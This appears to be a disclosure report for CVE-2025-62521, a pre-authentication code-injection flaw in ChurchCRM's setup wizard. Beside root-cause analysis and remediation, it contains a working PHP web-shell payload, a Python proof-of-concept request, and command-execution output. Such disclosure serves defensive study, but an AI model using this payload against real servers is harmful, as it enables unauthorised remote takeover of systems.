# CVE-2025-62521 Vulnerability Report

## Overview

- **CVE ID**: CVE-2025-62521
- **CWE**: CWE-94 (Improper Control of Generation of Code)
- **Affected Software**: ChurchCRM < 5.21.0
- **Vulnerability Type**: Pre-Authentication Remote Code Execution
- **CVSS Score**: 9.8 (Critical)

## Vulnerability Description

A pre-authentication remote code execution vulnerability exists in ChurchCRM's setup wizard. The vulnerability allows unauthenticated attackers to inject arbitrary PHP code during the initial installation process, leading to complete server compromise.

## Technical Analysis

### Vulnerable Code Location

File: `src/setup/routes/setup.php`

The vulnerability exists because user input from the setup form is directly concatenated into a PHP configuration template without proper validation or sanitization.

### Root Cause

The `DB_PASSWORD` field validation only checks if the password length is greater than 0:

```php
function is_valid_db_password($value)
{
    return strlen($value) > 0;
}
```

The password is then directly written into the configuration file template:

```php
$dbPassword = $setupData['DB_PASSWORD'];
// ...
$template = str_replace('||DB_PASSWORD||', $dbPassword, $template);
```

The configuration template (`Include/Config.php.example`) contains:

```php
$sPASSWORD = '||DB_PASSWORD||';
```

### Exploitation

By injecting PHP code through the `DB_PASSWORD` parameter, an attacker can break out of the string context and inject arbitrary PHP code:

**Payload Example:**
```
'; if(isset($_GET['cmd'])){system($_GET['cmd']);die();} //
```

**Resulting Config.php:**
```php
$sPASSWORD = ''; if(isset($_GET['cmd'])){system($_GET['cmd']);die();} //';
```

This injected code is executed on every page load, including direct access to `Include/Config.php`.

## Proof of Concept

### Prerequisites

- Target ChurchCRM instance must be in initial setup state (Config.php does not exist)
- Network access to the target server

### Exploitation Steps

1. Send a POST request to `/setup/` with malicious `DB_PASSWORD`:

```python
payload = "'; if(isset($_GET['cmd'])){system($_GET['cmd']);die();} //"
data = {
    "DB_SERVER_NAME": "database",
    "DB_SERVER_PORT": "3306",
    "DB_NAME": "churchcrm",
    "DB_USER": "churchcrm",
    "DB_PASSWORD": payload,
    "ROOT_PATH": "/",
    "URL": "http://target/"
}
requests.post("http://target/setup/", data=data)
```

2. Access the backdoor to execute commands:

```
http://target/Include/Config.php?cmd=id
```

### Verification Result

```
[*] Target: http://localhost:8088/
[*] Sending malicious setup request...
[+] Setup request successful, payload injected!
[*] Executing command: id
[+] Command output:
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Impact

- **Confidentiality**: Complete - Attackers can read any file accessible to the web server
- **Integrity**: Complete - Attackers can modify any file and execute arbitrary code
- **Availability**: Complete - Attackers can crash the service or delete critical files

## Remediation

Upgrade to ChurchCRM version 5.21.0 or later, which properly sanitizes all user input before writing to the configuration file.

## References

- https://github.com/ChurchCRM/CRM/security/advisories/GHSA-m8jq-j3p9-2xf3
- https://nvd.nist.gov/vuln/detail/CVE-2025-62521
